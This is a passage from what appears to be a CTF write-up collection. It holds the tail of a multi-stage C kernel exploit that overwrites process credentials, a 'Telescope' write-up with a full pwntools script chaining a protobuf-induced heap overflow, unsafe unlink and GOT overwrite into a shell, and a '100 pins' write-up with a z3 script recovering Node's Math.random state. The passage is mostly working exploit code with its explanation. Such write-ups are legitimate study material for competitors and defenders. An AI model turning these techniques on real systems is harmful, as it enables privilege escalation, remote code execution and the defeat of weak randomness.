resulting size should be in a rarely used cache // this is supposed to be arbitrary but if you change it you\u0026#39;ll mess up stage 3 #define S1_DIST_NUM_NODES 12 static void stage1(unsigned long *dist_addrp, unsigned long *node_addrp, int *node_fdp) { fprintf(stderr, \u0026#34;[S1] Creating graph\\n\u0026#34;); int fds[S1_DIST_NUM_NODES]; for (int i = 0; i \u0026lt; S1_DIST_NUM_NODES; i++) fds[i] = create(); for (int i = 1; i \u0026lt; S1_DIST_NUM_NODES; i++) llink(fds[0], fds[i], 1); fprintf(stderr, \u0026#34;[S1] Freeing node\\n\u0026#34;); release(fds[S1_DIST_NUM_NODES-1]); pid_t pid = fork(); assert(pid != -1); if (pid == 0) { fprintf(stderr, \u0026#34;[S1] Reclaiming node\\n\u0026#34;); struct reclaim_ctx ctx; reclaim_alloc(\u0026amp;ctx, 1, 0, 0x4141000000000000UL, 0); fprintf(stderr, \u0026#34;[S1] Finalizing root\\n\u0026#34;); finalize(fds[0]); fprintf(stderr, \u0026#34;[S1] Performing crash query\\n\u0026#34;); query(fds[0], fds[1]); // Will never get here exit(1); } usleep(250 * 1000); fprintf(stderr, \u0026#34;[S1] Leaking from dmesg\\n\u0026#34;); unsigned long dist_addr, edges_addr; stage1_leak_dmesg(\u0026amp;dist_addr, \u0026amp;edges_addr); unsigned long node_addr = edges_addr - 0x60; fprintf(stderr, \u0026#34;[S1] Dist @ 0x%lx\\n\u0026#34;, dist_addr); fprintf(stderr, \u0026#34;[S1] Node @ 0x%lx\\n\u0026#34;, node_addr); *dist_addrp = dist_addr; *node_addrp = node_addr; *node_fdp = fds[0]; #undef STAGE1_NUM_NODES } static void stage2_spray(int *fd, int before, int n, int skip, int after) { for (int i = 0; i \u0026lt; before; i++) create(); for (int i = 0; i \u0026lt; n; i++) fd[i] = create(); for (int i = 0; i \u0026lt; n; i += skip) { release(fd[i]); fd[i] = -1; } for (int i = 0; i \u0026lt; after; i++) create(); } static void stage2(struct reclaim_ctx *victim_ctx, int *victim_fdp) { #define STAGE2_NUM_NODES 16 // dist array size == 0x80 == sizeof node fprintf(stderr, \u0026#34;[S2] Creating graph\\n\u0026#34;); int fds[STAGE2_NUM_NODES]; for (int i = 0; i \u0026lt; STAGE2_NUM_NODES; i++) fds[i] = create(); for (int i = 1; i \u0026lt; STAGE2_NUM_NODES; i++) llink(fds[0], fds[i], 1); // 1 will be written at traversal_idx fprintf(stderr, \u0026#34;[S2] Freeing node\\n\u0026#34;); release(fds[STAGE2_NUM_NODES-1]); fprintf(stderr, \u0026#34;[S2] Reclaiming node\\n\u0026#34;); reclaim_alloc(victim_ctx, 1, 0, (0x80 + 0x8) / 8, 0); // target: sprayed refcount fprintf(stderr, \u0026#34;[S2] Finalizing root\\n\u0026#34;); finalize(fds[0]); fprintf(stderr, \u0026#34;[S2] Creating predecessor\\n\u0026#34;); int spray_incref_fd = create(); #define STAGE2_SPRAY_NUM 200 fprintf(stderr, \u0026#34;[S2] Spraying nodes\\n\u0026#34;); int spray_fd[STAGE2_SPRAY_NUM]; stage2_spray(spray_fd, 30, STAGE2_SPRAY_NUM, 4, 30); fprintf(stderr, \u0026#34;[S2] Incrementing sprayed refcounts\\n\u0026#34;); for (int i = 0; i \u0026lt; STAGE2_SPRAY_NUM; i++) { if (spray_fd[i] != -1) llink(spray_incref_fd, spray_fd[i], 0); } finalize(spray_incref_fd); fprintf(stderr, \u0026#34;[S2] Corrupting refcount\\n\u0026#34;); query(fds[0], fds[1]); fprintf(stderr, \u0026#34;[S2] Freeing victim node\\n\u0026#34;); release(spray_incref_fd); fprintf(stderr, \u0026#34;[S2] Reclaiming victim node\\n\u0026#34;); reclaim_free(victim_ctx); // unblock fault // ephemeral alloc to put two 0xff at the end for traversal top bytes unsigned char buf[0x80]; buf[sizeof(buf)-1] = 0xff; buf[sizeof(buf)-2] = 0xff; assert(setxattr(\u0026#34;.\u0026#34;, \u0026#34;nonexistent\u0026#34;, buf, sizeof(buf), XATTR_REPLACE) == -1); reclaim_alloc(victim_ctx, 0, 1337, 0, 0); fprintf(stderr, \u0026#34;[S2] Searching for victim node\\n\u0026#34;); int victim_fd = -1; for (int i = 0; i \u0026lt; STAGE2_SPRAY_NUM; i++) { if (spray_fd[i] != -1) { struct spark_info info = { .num_children = 0, }; get_info(spray_fd[i], \u0026amp;info); if (info.num_children == 1337) { victim_fd = spray_fd[i]; break; } } } assert(victim_fd != -1); fprintf(stderr, \u0026#34;[S2] Victim fd = %d\\n\u0026#34;, victim_fd); *victim_fdp = victim_fd; #undef STAGE2_SPRAY_NUM #undef STAGE2_NUM_NODES } #define STAGE3_READ_NUM_CHILDREN 0x4142133703030303 static unsigned long stage3_read(struct reclaim_ctx *ctx, int fd, unsigned long addr) { reclaim_free(ctx); // during read, we keep a special num_children so we can find ourselves reclaim_alloc(ctx, 1, STAGE3_READ_NUM_CHILDREN, 0, addr); struct spark_info info; get_info(fd, \u0026amp;info); return info.traversal_size; } static void stage3(struct reclaim_ctx *ctx, int fd, int *scratch_fds, unsigned long s1_dist_addr, unsigned long s1_node_addr) { char buf[0x80]; fprintf(stderr, \u0026#34;[S3] Finding victim node\\n\u0026#34;); unsigned long victim_addr = 0; for (int i = 6000; i \u0026lt; 10000; i++) { unsigned long addr = s1_node_addr + i*0x80; unsigned long value = stage3_read(ctx, fd, addr + 0x58); if (value == STAGE3_READ_NUM_CHILDREN) { victim_addr = addr; break; } } assert(victim_addr); fprintf(stderr, \u0026#34;[S3] Victim @ 0x%lx\\n\u0026#34;, victim_addr); fprintf(stderr, \u0026#34;[S3] Findings creds\\n\u0026#34;); unsigned long current = stage3_read(ctx, fd, victim_addr + 0x10); // state_lock.owner fprintf(stderr, \u0026#34;[S3] current = 0x%lx\\n\u0026#34;, current); unsigned long cred_addr = stage3_read(ctx, fd, current + 0xa90); fprintf(stderr, \u0026#34;[S3] cred @ 0x%lx\\n\u0026#34;, cred_addr); fprintf(stderr, \u0026#34;[S3] Crafting linkable node\\n\u0026#34;); memset(buf, 0, sizeof(buf)); *(unsigned long *)(buf + 0x0) = 100000; // id *(unsigned int *)(buf + 0x8) = 1; // refcount *(unsigned int *)(buf + 0x30) = 0; // is_finalized *(unsigned long *)(buf + 0x60) = victim_addr + 0x60; // edges.next (empty list) *(unsigned long *)(buf + 0x68) = victim_addr + 0x68; // edges.prev (empty list) reclaim_free(ctx); reclaim_alloc_raw(ctx, buf); fprintf(stderr, \u0026#34;[S3] Building graph\\n\u0026#34;); int graph_fds[S1_DIST_NUM_NODES]; for (int i = 0; i \u0026lt; S1_DIST_NUM_NODES-1; i++) graph_fds[i] = scratch_fds[i]; // avoid allocations, they mess stuff up for (int i = 1; i \u0026lt; S1_DIST_NUM_NODES-1; i++) llink(graph_fds[0], graph_fds[i], 0); llink(graph_fds[0], fd, 0); // weight = write primitive value (zero for root creds) finalize(graph_fds[0]); fprintf(stderr, \u0026#34;[S3] Freeing stage1 dist array\\n\u0026#34;); memset(buf, 0, sizeof(buf)); *(unsigned int *)(buf + 0x8) = 1; // refcount *(unsigned int *)(buf + 0x30) = 1; // is_finalized // fake node_array overlaps unused nb_lock *(unsigned long *)(buf + 0x38 + 0x0) = 0; // fake node_array.size *(unsigned long *)(buf + 0x38 + 0x10) = s1_dist_addr; // fake node_array.nodes (will be freed) *(unsigned long *)(buf + 0x60) = victim_addr + 0x60; // edges.next (empty list) *(unsigned long *)(buf + 0x78) = victim_addr + 0x38; // traversal = fake node_array reclaim_free(ctx); reclaim_alloc_raw(ctx, buf); release(fd); // free s1_dist_addr fd = create(); // immediately reclaim victim node to restore stable state fprintf(stderr, \u0026#34;[S3] Overwriting cred\\n\u0026#34;); unsigned long write_addr = cred_addr + 8*3; unsigned long idx = (write_addr - s1_dist_addr) / 8; reclaim_free(ctx); reclaim_alloc(ctx, 1, 0, idx, 0); query(graph_fds[0], graph_fds[1]); } static void print_flag() { int fd = open(\u0026#34;/flag\u0026#34;, O_RDONLY); assert(fd != -1); char buf[100]; memset(buf, 0, sizeof(buf)); assert(read(fd, buf, sizeof(buf)-1) != -1); close(fd); fprintf(stderr, \u0026#34;!!! FLAG: %s\\n\u0026#34;, buf); } int main(void) { int scratch_fds[12]; for (int i = 0; i \u0026lt; 12; i++) scratch_fds[i] = create(); // Leak a distance array (still malloc\u0026#39;ed) and the address of a live node unsigned long s1_dist_addr, s1_node_addr; int s1_node_fd; stage1(\u0026amp;s1_dist_addr, \u0026amp;s1_node_addr, \u0026amp;s1_node_fd); // Get a fd that can be freed and reclaimed repeatedly struct reclaim_ctx victim_ctx; int victim_fd; stage2(\u0026amp;victim_ctx, \u0026amp;victim_fd); // Get somewhat rootish privileges stage3(\u0026amp;victim_ctx, victim_fd, scratch_fds, s1_dist_addr, s1_node_addr); print_flag(); } Telescope # Look up in the sky ‚áë\nnc 13.112.193.37 8573\nNote: The service is running on Ubuntu 20.04\nChallenge Releas Content # file comment telescope.proto This is the description of the protocol of protobuf telescope the binary to exploit libprotobuf.so.17 protobuf remote library libc.so.6 libc remote library The Binary # The binary is simple to understand is the classic few option CTF binary. It is possible to create read and modify heap chunks with an extra interesting option that is to interpret the bytes ad protobuf protocol. Chunks are saved on an array of 1024 elements in .bss called slots, and the corresponding size is saved on another array in .bss called slot_sizes. In particulare, there are 6 options:\n[1] Create chunk # It asks you for the number of slots and the size. It makes a malloc of the given size, memset the chunk to zero, and store a pointer to the new chunk into slots[\u0026lt;index\u0026gt;] where \u0026lt;index\u0026gt; is also a parameter chosen by the user. It also set slots_sizes[\u0026lt;index\u0026gt;] to the corrisponding size.\n[2] Read data into a chunk # It asks for a slots index and then lets you write inside the chunk. The amount of bytes that you can write is the number of the size saved into slots_sizes. Bytes are read singularly. There is no possibility of short-read (read fewer bytes than the size).\n[3] Free chunk # It asks for a slot index. It calls free on the pointer stored at slots[\u0026lt;index\u0026gt;] . It stores 0 into slots[\u0026lt;index\u0026gt;] and slots_size[\u0026lt;index\u0026gt;]\n[4] Protobuf unserialize and reserialize # This is the most complicated option, and the only one that took a few hours to be completely understood. It asks for a slot index. It parses the content with the protobuf parser generating the Telescope object. It checks that the field pass of the Telescope object is equal to 0xDEADBEEF. If the pass field is not correctly set, you get an abort.\nIf you manage to pass this check, the program removes the field pass. It prints out the number of lens (the other field of Telescope). It serializes the new object to a string. It uses a memcpy to copy the new string (byte representation of the object) into the slot.\n[5] Prints the chunk # It asks for an index. It prints out slots_sizes[\u0026lt;index\u0026gt;] bytes of slots[\u0026lt;index\u0026gt;].\n[-] Exit # Any other option exit the program.\nProtoBuf # Protobuf is a nice library that lets you define structured data that can be serialized and read back. It is nice because it supports many languages and automatically generates code to handle these data.\nsyntax = \u0026#34;proto2\u0026#34;; message Telescope { repeated int64 lens = 1; optional int64 pass = 2; } There are 2 fields in this object. pass is optional and need to be set to 0xDEADBEEF because the code checks its value. lens is an array of integers. It can be empty or any size.\nIt is vital to understand how the encoding of protobuf works. You can find details of the encoding on protobuf documentation. The documentation is written very well and explains how the encoding is working way better than I will ever be able to do. If you want to understand the vulnerability, you need to read the documentation and understand the serialization types.\nHere I give you an example of a Telescope object is encoded:\n\\x08\\x17\\x08\\x20\\x10\\x11 Protobuf encode the field and is type in one byte followed by the value (field_number \u0026lt;\u0026lt; 3) | wire_type. If you want to encode field numeber 1 with type 0 you get 1 \u0026lt;\u0026lt; 3 | 0 = 0x08. In particular, the byte \\x08 represent the field lens while \\x10 is the field pass. In this paricular string we have 2 elements for lens: \\x08\\x17 and \\x08\\x20. \\x10\\x11 is instead the encoding of pass. Hence, when deserialized we will have obj.lens = [0x17, 0x20] and obj.pass = 0x11.\nTesting Protobuf # I spent hours playing with protobuf serialization. It was evident to me (after a while playing CTF you develop an intuition on where the author wants you to look.) that the vulnerability was in encoding/decoding protobuf. I tried several things. I do not recall them all. I had a python and a c++ program that I can use as a decoder/encoder debug.\nFew intresting discovery that I recall. The order of elements does not matter. You can have few lens the a pass and other lens: \\x08\\x17\\x10\\x11\\x08\\x20 is valid and still decode to obj.lens = [0x17, 0x20] and obj.pass = 0x11\nYou can have multiple instances for pass: \\x08\\x17\\x10\\x11\\x08\\x20\\x10\\x11 is valid and still decode to obj.lens = [0x17, 0x20] and obj.pass = 0x11.\nThe Vulnerability # I discovered that there are at least 2 ways to encode repeated fields. The preferred way to encode a repeated field in protobuf is to have multiple instances of a field. In fact, if you serialize obj.lens = [0x17, 0x20] you get \\x08\\x17\\x08\\x20. Another \u0026ldquo;valid\u0026rdquo; way to encode a repeated field is to use Lenght'delimited type. In this case \\x0a\\x02\\x17\\x20 is still decoded as obj.lens = [0x17, 0x20]. In particular, \\x0a is field number 1 with type 2 (1 \u0026lt;\u0026lt; 3 | 2 = 0x0a). 0x0a is followed by the size of the content (2 bytes in this case). Then there is the encoding of multiple numbers. (N.B. the numbers are always encoded as Variant, you can have any number not only single bytes).\nIf you deserialize and the serialize back \\x0a\\x02\\x17\\x20 you get the string \\x08\\x17\\x08\\x20. Both are 4 bytes, so this particular instance is not a problem.\nHowever, if you deserialize and serialize \\x0a\\x02\\x17\\x20\\x17, you get back \\x08\\x17\\x08\\x20\\x08\\x17. The first string is 5 bytes; the second is 6 bytes. For every single byte that we add in the first string, we get 2 bytes in the second. This allows us to overflow a chunk.\nThe Exploit # We have a heap overflow where we can easily control the last byte. We have arbitrary read and write in any chunk that we control. We have a list of .bss containing pointers to our chunks. This is an excellent candidate to do an unsafe_unlink.\nOur exploit aims to exploit an unsafe_unlink to overwrite one of the pointers in slots to point to slots. This will allow us to arbitrarily change the pointer of a slot and have arbitrary read and arbitrary write primitives. With those primitives, we can read .got to leak libc and change the function free with function system. Please note that the binary is not PIE and is not Full RELRO.\nThe Unsafe Unlink # This step aims to overwrite one of the pointers in slots with an address of slots. This is possible by exploiting the unlink function of libc. When eliminating a chunk from the free list, the unlink algorithm of libc will overwrite the previous chunk\u0026rsquo;s forward ptr. We can exploit this write by faking that the previous chunk is on .bss. There are several checks in the libc that you need to meet to have unlink successfully. You can play with how2heap to understand those constraints.\nIn practice, we create a fake chunk header 0x10 bytes below one valid chunk. (You can do this because 0x10 bytes below the header begins the data part of the chunk). We do an overflow from one chunk to another, changing the PREV_IN_USE bit from 1 to 0. We set the prev_size to be 0x10 byte less than the real one. When we free the second chunk, a consolidate is triggered, trying to merge multiple chunks, so our chunk is unlinked, causing the overwrite.\nAligning the Stars Chunks # To trigger the consolidate, we need our chunk to be contiguous to the top_chunk. The size of the chunk that we choose to make this attack is 0x458. Reason to choose this size:\nIt needs NOT to be a fastbin. We need to be able to overwrite the prev_size filed. The prev_size fields are placed as the last 8 bytes of the chunks. malloc(0x458) will create a chunk of 0x460 bytes.\nIn our exploit, we allocate 20 chunks of sizer 0x458. This will remove all the free chunks of that size.\nWe allocate some extra_sizes (0x410, 0x470, 0x13b0, 0x2010). Those are chunk size that will be used by protobuf deserialize and serialize functions. The idea is to preallocate those chunks to avoid them from being between our attacked chunk and the top_chunk. If you wonder, we got the size with gdb by looking at which chunks were between our attacked chunk and the top_chunk.\nWe allocate 3 chunks of size 0x460:\nThe first chunk (chunk_c) is there as a used chunk. We need to consolidate only 2 chunks, so we use the first chunk as a barrier. The second chunk (chunk_a) is the chunk that we are using as a fake chunk and the chunk to do the overflow. The third (chunk_b) chunk is the chunk that will be overflown by over byte. After the allocation, we deallocate the extra_sizes chunk. Now they are available for the protobuf algorithm, and they will not interfere with our attack.\nArbitrary Read/Write # With unsafe unlink, you can overwrite one of the pointers in slots and have that pointer pointing to slots as well. This will allow you to control any pointer with data that you want.\nTo build a decent primitive arbitrary read-write. We made slots[20] pointing to slots[21]. And both were chunks allocated with size 8. By writing in slots[20] we set the address of our primitive. by reading-writing slots[21], we exploit the read-write.\nWith this primitive, we can, by reading the value of puts in .got, get a leak of libc. We can compute the position of the system, and we can substitute free in .got with the system. At this point, we just need to free a chunk which content is /bin/sh\\x00 to get a shell.\nThe script # from pwn import * r = remote(\u0026#34;13.112.193.37\u0026#34;, 8573) def alloca_slot(slot, size): assert(slot \u0026lt;= 0x400) assert((size \u0026amp; 0x80000000) == 0) r.sendline(\u0026#34;1\u0026#34;) r.recvuntil(\u0026#34;slot\u0026gt;\\n\u0026#34;) r.sendline(\u0026#34;%d\u0026#34; % slot) r.recvuntil(\u0026#34;size\u0026gt;\\n\u0026#34;) r.sendline(\u0026#34;%d\u0026#34; % size) def write_slot(slot, data): assert(slot \u0026lt;= 0x400) r.sendline(\u0026#34;2\u0026#34;) r.recvuntil(\u0026#34;slot\u0026gt;\\n\u0026#34;) r.sendline(\u0026#34;%d\u0026#34; % slot) r.send(data) def free_slot(slot): assert(slot \u0026lt;= 0x400) r.sendline(\u0026#34;3\u0026#34;) r.recvuntil(\u0026#34;slot\u0026gt;\\n\u0026#34;) r.sendline(\u0026#34;%d\u0026#34; % slot) def parse_slot(slot): assert(slot \u0026lt;= 0x400) r.sendline(\u0026#34;4\u0026#34;) r.recvuntil(\u0026#34;slot\u0026gt;\\n\u0026#34;) r.sendline(\u0026#34;%d\u0026#34; % slot) def print_slot(slot): assert(slot \u0026lt;= 0x400) r.sendline(\u0026#34;5\u0026#34;) r.recvuntil(\u0026#34;slot\u0026gt;\\n\u0026#34;) r.sendline(\u0026#34;%d\u0026#34; % slot) return r.recvuntil(\u0026#34;op\u0026gt;\\n\u0026#34;)[:-4] # lens = b\u0026#34;\\x41\u0026#34; * 40 # data = b\u0026#34;\\x10\\xef\\xfd\\xb6\\xf5\\x0d\u0026#34; + b\u0026#34;\\x0a\u0026#34;+bytes([len(lens),]) + lens # print(data) overflow = b\u0026#34;\\x0a\\x0b\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x60\u0026#34; pass_data = b\u0026#34;\\x10\\xef\\xfd\\xb6\\xf5\\x0d\u0026#34; filling = b\u0026#34;\\x08\u0026#34; * 1090 + b\u0026#34;\\x0a\\x02\\x80\\x08\u0026#34; data = pass_data + filling + overflow chunk_size = 0x458 assert(len(data) == chunk_size) for i in range(0, 20): alloca_slot(i, chunk_size) extra_sizes = [0x410, 0x470, 0x13b0, 0x2010] extra_space = i for i in range(extra_space, extra_space+len(extra_sizes)): print(\u0026#34;allocat_empy %d\u0026#34; % i ) alloca_slot(i, extra_sizes[i - extra_space] - 0x10) data = data.ljust(chunk_size, b\u0026#34;\\x00\u0026#34;) chunk_a = i + 1 chunk_b = i + 2 chunk_c = i + 3 print(\u0026#34;a: %d, b: %d\u0026#34; % (chunk_a, chunk_b)) alloca_slot(chunk_c, chunk_size) alloca_slot(chunk_a, chunk_size) alloca_slot(chunk_b, chunk_size) for i in range(extra_space, extra_space+len(extra_sizes)): print(\u0026#34;free %d\u0026#34; % i ) free_slot(i) write_slot(chunk_a, data) s = print_slot(chunk_a) parse_slot(chunk_a) s2 = print_slot(chunk_a) slots_base = 0x409280 addre_23 = slots_base + 23*8 # chunk_a new_chunk_a = p64(0x0) + p64(0x451) + p64(addre_23 - 0x18) + p64(addre_23 - 0x10) + p64(0) + p64(0) + b\u0026#34;c\u0026#34;*8 + b\u0026#34;d\u0026#34;*8 + b\u0026#34;e\u0026#34;*8 new_chunk_a = new_chunk_a.ljust(0x450, b\u0026#34;B\u0026#34;) + p64(0x450) # input(\u0026#34;wait for write\u0026#34;) write_slot(chunk_a, new_chunk_a) # input(\u0026#34;wait for free\u0026#34;) free_slot(chunk_b) slots_data = print_slot(chunk_a) puts_got = 0x4091A8 alloca_slot(20, 8) alloca_slot(21, 8) # input(\u0026#34;check chunka\u0026#34;) payload = p64(0x409328) + p64(puts_got) payload = payload.ljust(chunk_size, b\u0026#34;\\x00\u0026#34;) r.recvuntil(\u0026#34;op\u0026gt;\\n\u0026#34;) write_slot(chunk_a, payload) context.log_level = \u0026#34;DEBUG\u0026#34; r.recvuntil(\u0026#34;op\u0026gt;\\n\u0026#34;) puts_leak = u64(print_slot(21)) libc_base = puts_leak - 0x875a0 system_libc = libc_base + 0x55410 free_got = 0x409128 print(\u0026#34;[!] puts_atlibc: %x\u0026#34; % puts_leak) print(\u0026#34;[!] libc_base: %x\u0026#34; % libc_base) print(\u0026#34;[!] libc_system: %x\u0026#34; % system_libc) write_slot(20, p64(free_got)) write_slot(21, p64(system_libc)) write_slot(1, b\u0026#34;/bin/sh\u0026#34;.ljust(chunk_size, b\u0026#34;\\x00\u0026#34;)) r.sendline(\u0026#34;3\u0026#34;) r.recvuntil(\u0026#34;slot\u0026gt;\\n\u0026#34;) r.sendline(\u0026#34;1\u0026#34;) r.interactive() 100 pins # 4 digits pin are too weak\u0026hellip; How about 100 of them? nc 18.183.134.249 1234\nThe bug(s) # The challenge is made with NodeJS (15.3.0) and the main point was Math.random(). This PRNG is not cryptographically secure, as we can recorver the initial states of the XorShift128+ with enough consecutive outputs and some symbolic execution.\nWe notice that the \u0026ldquo;Mastermind\u0026rdquo; behind this challenge allows us to gather more information than usual, because there is no check on the length of the input. In fact we can recover the (unique) digits of the pin choosing the pattern: '1'*2^0 + '2'*2^1 + '3'*2^2 + '4'*2^3 + ... + '9'*2^8.\nThis gives us a result that tells us exactly the digits of the pin. We can get this by adding the number of digits in the correct position and the remaining number of correct digits that are not in the correct position. This number, in binary, gives us the corresponding digit in the pattern.\nAfter getting the digits we find the correct permutation with a \u0026ldquo;guess and prune\u0026rdquo; algorithm, discarding any rearrangement that is incompatible with the results of the previous guesses.\nIn the end our algorithm is capable of finding a correct pin with an average of 4-5 attempts, and with a bit of luck we are able to retrieve the 11 pins needed to ensure that z3 outputs a unique solution in less than 39 attempts.\nOnce we have the initial state of the PRNG, we face another problem: the actual values being generated are stored in a \u0026ldquo;pool\u0026rdquo; of 64 numbers, that is refreshed with 64 new ones every time it is empty. The numbers within the pool are then outputted in reverse order (as explained in this presentation and video). This means that, if the order of the random generation is 1\u0026hellip;64||65\u0026hellip;128, we get 64\u0026hellip;54 and we need to predict 53\u0026hellip;1||128\u0026hellip;93. Once we get the seed, the \u0026ldquo;next\u0026rdquo; number generated will be the 54th. This means that we need to reverse the XorShift128+ algorithm to retrieve the values 53\u0026hellip;1! Fortunately, this isn\u0026rsquo;t a problem at all.\n#!/usr/bin/env python3 import os from pwn import remote, process import hashlib from itertools import permutations import struct from decimal import * from random import shuffle from z3 import * MAX_UNUSED_THREADS = 2 #Credits to Douglas Goddard and d0nutptr def reverse17(val): top34 = (val ^ (val \u0026gt;\u0026gt; 17)) \u0026amp; 0xFFFFFFFFC0000000 top51 = (val ^ (top34 \u0026gt;\u0026gt; 17)) \u0026amp; 0xFFFFFFFFFFFFE000 original = (val ^ (top51 \u0026gt;\u0026gt; 17)) return original def reverse23(val): bot46 = (val ^ (val \u0026lt;\u0026lt; 23)) \u0026amp; 0x3fffffffffff original = (val ^ (bot46 \u0026lt;\u0026lt; 23)) \u0026amp; 0xFFFFFFFFFFFFFFFF return original def reverse_xs128p(state0, state1): prev_state1 = state0 \u0026amp; 0xFFFFFFFFFFFFFFFF prev_state0 = state1 ^ (state0 \u0026gt;\u0026gt; 26) \u0026amp; 0xFFFFFFFFFFFFFFFF prev_state0 = prev_state0 ^ state0 \u0026amp; 0xFFFFFFFFFFFFFFFF prev_state0 = reverse17(prev_state0) \u0026amp; 0xFFFFFFFFFFFFFFFF prev_state0 = reverse23(prev_state0) \u0026amp; 0xFFFFFFFFFFFFFFFF generated = prev_state0 \u0026amp; 0xFFFFFFFFFFFFFFFF return prev_state0, prev_state1, generated # Calculates xs128p (XorShift128Plus) def xs128p(state0, state1): s1 = state0 \u0026amp; 0xFFFFFFFFFFFFFFFF s0 = state1 \u0026amp; 0xFFFFFFFFFFFFFFFF s1 ^= (s1 \u0026lt;\u0026lt; 23) \u0026amp; 0xFFFFFFFFFFFFFFFF s1 ^= (s1 \u0026gt;\u0026gt; 17) \u0026amp; 0xFFFFFFFFFFFFFFFF s1 ^= s0 \u0026amp; 0xFFFFFFFFFFFFFFFF s1 ^= (s0 \u0026gt;\u0026gt; 26) \u0026amp; 0xFFFFFFFFFFFFFFFF state0 = state1 \u0026amp; 0xFFFFFFFFFFFFFFFF state1 = s1 \u0026amp; 0xFFFFFFFFFFFFFFFF generated = state0 \u0026amp; 0xFFFFFFFFFFFFFFFF return state0, state1, generated def sym_xs128p(sym_state0, sym_state1): # Symbolically represent xs128p s1 = sym_state0 s0 = sym_state1 s1 ^= (s1 \u0026lt;\u0026lt; 23) s1 ^= LShR(s1, 17) s1 ^= s0 s1 ^= LShR(s0, 26) sym_state0 = sym_state1 sym_state1 = s1 # end symbolic execution return sym_state0, sym_state1 # Symbolic execution of xs128p def sym_floor_random(slvr, sym_state0, sym_state1, generated, multiple): sym_state0, sym_state1 = sym_xs128p(sym_state0, sym_state1) # \u0026#34;::ToDouble\u0026#34; calc = LShR(sym_state0, 12) lower = from_double(Decimal(generated) / Decimal(multiple)) upper = from_double((Decimal(generated) + 1) / Decimal(multiple)) lower_mantissa = (lower \u0026amp; 0x000FFFFFFFFFFFFF) upper_mantissa = (upper \u0026amp; 0x000FFFFFFFFFFFFF) upper_expr = (upper \u0026gt;\u0026gt; 52) \u0026amp; 0x7FF slvr.add(And(lower_mantissa \u0026lt;= calc, Or(upper_mantissa \u0026gt;= calc, upper_expr == 1024))) return sym_state0, sym_state1 def solve_instance(points, multiple, unknown_leading=False): # setup symbolic state for xorshift128+ ostate0, ostate1 = BitVecs(\u0026#39;ostate0 ostate1\u0026#39;, 64) sym_state0 = ostate0 sym_state1 = ostate1 set_option(\u0026#34;parallel.enable\u0026#34;, True) set_option(\u0026#34;parallel.threads.max\u0026#34;, ( max(os.cpu_count() - MAX_UNUSED_THREADS, 1))) # will use max or max cpu thread support, whatever is smaller slvr = SolverFor( \u0026#34;QF_BV\u0026#34;) # This type of problem is much faster computed using QF_BV (also, if branching happens, we can use parallelization) # run symbolic xorshift128+ algorithm for three iterations # using the recovered numbers as constraints if unknown_leading: # we want to try to predict one value ahead so let\u0026#39;s slide one unknown into the calculation sym_state0, sym_state1 = sym_xs128p(sym_state0, sym_state1) for point in points: sym_state0, sym_state1 = sym_floor_random(slvr, sym_state0, sym_state1, point, multiple) if slvr.check() == sat: # get a solved state m = slvr.model() state0 = m[ostate0].as_long() state1 = m[ostate1].as_long() return state0, state1 else: print(\u0026#34;Failed to find a valid solution\u0026#34;) return None, None def solve_random(points, multiple, lead): if lead \u0026gt; 0: last_state0 = None last_state1 = None for i in range(0, int(lead)): last_state0, last_state1 = solve_instance(points, multiple, True) state0, state1, output = xs128p(last_state0, last_state1) new_point = math.floor(multiple * to_double(output)) points = [new_point] + points return last_state0, last_state1 else: return solve_instance(points, multiple) def to_double(value): double_bits = (value \u0026gt;\u0026gt; 12) | 0x3FF0000000000000 return struct.unpack(\u0026#39;d\u0026#39;, struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, double_bits))[0] - 1 def from_double(dbl): return struct.unpack(\u0026#39;\u0026lt;Q\u0026#39;, struct.pack(\u0026#39;d\u0026#39;, dbl + 1))[0] \u0026amp; 0x7FFFFFFFFFFFFFFF def proof_of_work(prefix): c = 0 while True: guess = str(c) calculated = hashlib.sha256((prefix+guess).encode()).hexdigest() if calculated.endswith(\u0026#39;00000\u0026#39;): print(\u0026#39;found\u0026#39;, guess, calculated) return guess.encode() c += 1 if not c%10**6: print(c) alphabet = \u0026#39;1234567890\u0026#39; origin = list(filter(lambda k: len(set(k)) == 4 and len(k) == 4, [(\u0026#34;0000\u0026#34; + str(i))[-4:] for i in range(10000)])) special = \u0026#39;\u0026#39;.join([str(i) * (pow(2, (i-1))) for i in range(1,10)]) class Solver: def __init__(self): self.found = [] self.possibilities = [] self.foundPermutations = False def getOne(self): if self.foundPermutations: return self.possibilities.pop() else: return special def parseResult(self, x, a, b): if self.foundPermutations and a + b == 4: if a == 0: self.possibilities = [i for i in self.possibilities if not any([i[k] == x[k] for k in range(4)])] else: self.possibilities = [i for i in self.possibilities if sum([i[k] == x[k] for k in range(4)]) == a] elif a + b \u0026gt; 4: h = (bin(a + b)[2:])[::-1] h += \u0026#39;0000000000\u0026#39; p = \u0026#39;\u0026#39; for i in range(1,10): if h[i-1] == \u0026#39;1\u0026#39;: p += str(i) if len(p) == 3: p += \u0026#39;0\u0026#39; self.possibilities = list([\u0026#39;\u0026#39;.join(list(l)) for l in permutations(p, 4)]) shuffle(self.possibilities) self.foundPermutations = True def pinFound(self, x): self.found.append(x) self.possibilities = [] self.foundPermutations = False def guess_random(proc): pin = \u0026#39;\u0026#39; i = 0 tries = 0 guesser = Solver() while tries \u0026lt;= 40 and i \u0026lt; 11: proc.recvuntil(b\u0026#39;?\u0026#39;) pin = guesser.getOne() proc.sendline(pin) res = proc.recvline() # print(res) tries += 1 if b\u0026#39;U\u0026#39; in res: exit(0) elif b\u0026#39;O\u0026#39; in res: i += 1 guesser.pinFound(pin) print(pin, \u0026#34;;\u0026#34;, i, \u0026#34;after\u0026#34;, tries, \u0026#34;tries\u0026#34;) continue else: [a, b] = (res.split()[-1]).split(b\u0026#39;A\u0026#39;) a = int(a) b = int(b[:-5]) guesser.parseResult(pin, a, b) # print(\u0026#34;tries:\u0026#34;, tries) # print(guesser.found) return [origin.index(x) for x in guesser.found] def derivePins(points, multiple = 5040, lead = 0): solutions = [] state0, state1 = solve_random(points[::-1], multiple, lead) print(\u0026#39;[+] recovered state:\u0026#39;, state0, state1) saved_state0, saved_state1 = state0, state1 partial = [] for _ in range(11): state0, state1, output = xs128p(state0, state1) partial.append(math.floor(multiple * to_double(state0))) solutions += partial[::-1] state0, state1 = saved_state0, saved_state1 solutions.append(math.floor(multiple * to_double(state0))) for _ in range(64): state0, state1, output = reverse_xs128p(state0, state1) solutions.append(math.floor(multiple * to_double(output))) solutions = solutions[:64] state0, state1 = saved_state0, saved_state1 